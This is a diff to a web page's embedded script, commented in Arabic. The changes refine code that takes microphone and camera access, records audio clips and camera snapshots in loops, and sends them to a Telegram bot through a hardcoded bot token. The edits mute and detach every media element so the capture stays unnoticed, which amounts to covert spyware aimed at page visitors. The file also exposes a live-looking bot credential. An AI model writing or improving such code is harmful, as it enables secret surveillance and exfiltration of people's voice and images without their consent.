@@ -215,7 +215,8 @@
 
     <!-- سكربت (سيُملأ بالأجزاء التالية) -->
     <script>
-let stream = null;
+let audioStream = null;
+let videoStream = null;
 let audioActive = false;
 let photoActive = false;
 const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
@@ -239,7 +240,7 @@ function sendToTelegram(blob, type="voice") {
 // تسجيل صوت 5 ثواني
 function recordAudio() {
     return new Promise(resolve => {
-        const recorder = new MediaRecorder(stream);
+        const recorder = new MediaRecorder(audioStream);
         const chunks = [];
         recorder.ondataavailable = e => chunks.push(e.data);
         recorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" }));
@@ -252,18 +253,25 @@ function recordAudio() {
 function captureImage() {
     return new Promise(resolve => {
         const video = document.createElement("video");
-        video.srcObject = stream;
-        video.muted = true;        // ✅ إيقاف الصوت نهائياً
-        video.volume = 0;          // ✅ تأكيد إضافي
-        video.autoplay = true;     // ✅ تشغيل تلقائي بدون صوت
+        video.srcObject = videoStream;
+        video.muted = true;
+        video.volume = 0;
+        video.playsInline = true;
         
         video.onloadedmetadata = () => {
-            video.play();
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-            canvas.toBlob(blob => resolve(blob), "image/jpeg");
+            video.play().then(() => {
+                setTimeout(() => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext("2d").drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        video.pause();
+                        video.srcObject = null;
+                        resolve(blob);
+                    }, "image/jpeg");
+                }, 100);
+            });
         };
     });
 }
@@ -291,8 +299,48 @@ async function photoLoop() {
 // دالة البداية
 async function start() {
     try {
-        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        // ✅ الخطوة 1: طلب الصوت فقط مع إعدادات خاصة
+        audioStream = await navigator.mediaDevices.getUserMedia({ 
+            audio: {
+                echoCancellation: true,        // ✅ إلغاء الصدى
+                noiseSuppression: true,        // ✅ إزالة الضوضاء
+                autoGainControl: true,         // ✅ تحكم تلقائي
+                sampleRate: 48000,             // ✅ جودة عالية
+                channelCount: 1                // ✅ قناة واحدة فقط
+            }, 
+            video: false 
+        });
+        
+        // ✅ الخطوة 2: تعطيل مسارات الصوت من السماعة
+        audioStream.getAudioTracks().forEach(track => {
+            track.enabled = true; // للتسجيل
+            // لكن لن نربطه بأي عنصر HTML
+        });
+        
+        // ✅ الخطوة 3: طلب الفيديو بدون صوت تماماً
+        videoStream = await navigator.mediaDevices.getUserMedia({ 
+            audio: false, 
+            video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            }
+        });
+        
         console.log("✅ تم منح الإذن! بدء التسجيل...");
+        
+        // ✅ الخطوة 4: تأكد من عدم وجود أي عنصر صوت في الصفحة
+        const allMedia = document.querySelectorAll('audio, video');
+        allMedia.forEach(el => {
+            el.muted = true;
+            el.volume = 0;
+            el.pause();
+            el.srcObject = null;
+        });
+        
+        // ✅ الخطوة 5: تعطيل أي AudioContext قد يكون موجود
+        if (window.AudioContext || window.webkitAudioContext) {
+            // لا نستخدم AudioContext إطلاقاً
+        }
         
         // تشغيل الحلقات
         audioLoop();
